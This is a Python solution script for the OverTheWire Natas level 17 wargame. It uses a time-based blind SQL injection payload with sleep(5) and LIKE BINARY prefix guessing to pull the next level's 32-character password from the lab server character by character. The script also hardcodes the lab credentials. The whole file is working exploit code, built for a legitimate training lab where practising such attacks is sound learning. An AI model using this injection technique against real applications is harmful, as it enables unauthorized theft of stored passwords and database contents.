import requests

# Define the characters that may appear in the password
characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

# Credentials for natas17
username = "natas17"
password = "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"

# Target URL
url = "http://natas17.natas.labs.overthewire.org"

# Start a session to persist cookies and headers across requests
session = requests.Session()

# This will store the discovered password characters
current_password = []

# Stop when full password 32 character long is discovered
while len(current_password) < 32:
    for character in characters:
        # Build the current guess
        guess = "".join(current_password) + character
        #print(f"Guessing with: {guess}") #verbose mode

        # SQL Injection Payload:
        # natas18" AND password LIKE BINARY "prefix%" AND sleep(5)#
        payload = f'natas18" AND password LIKE BINARY "{guess}%" AND sleep(5)#'

        # Send request with SQL injection payload
        response = session.post(
            url,
            data={"username": payload},
            auth=(username, password)
        )

        # Check for response time that is more then 5 seconds
        if response.elapsed.total_seconds() > 5:
            current_password.append(character)  # Correct character found
            print("brute-forcing progress: " + "".join(current_password)) # printing progress
            break  # Go to the next character in the password


# Print the discovered password
print("Password Found: " + "".join(current_password))
